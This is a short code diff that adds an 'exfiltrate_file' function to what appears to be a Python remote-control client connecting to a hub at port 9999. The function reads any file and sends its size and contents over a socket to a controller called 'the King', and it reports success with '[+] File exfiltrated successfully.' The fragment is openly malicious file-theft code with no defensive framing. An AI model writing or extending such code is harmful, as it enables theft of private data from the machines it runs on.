@@ -126,3 +126,14 @@ if __name__ == '__main__':
     HUB_PORT = 9999
     
     connect_to_hub(HUB_IP, HUB_PORT)
+
+def exfiltrate_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, "rb") as f:
+            data = f.read()
+            # We send the size first so the King knows how much to catch
+            client.send(f"SIZE {len(data)}".encode())
+            time.sleep(1) # Wait for King to prepare
+            client.sendall(data)
+            return "[+] File exfiltrated successfully."
+    return "[!] File not found."
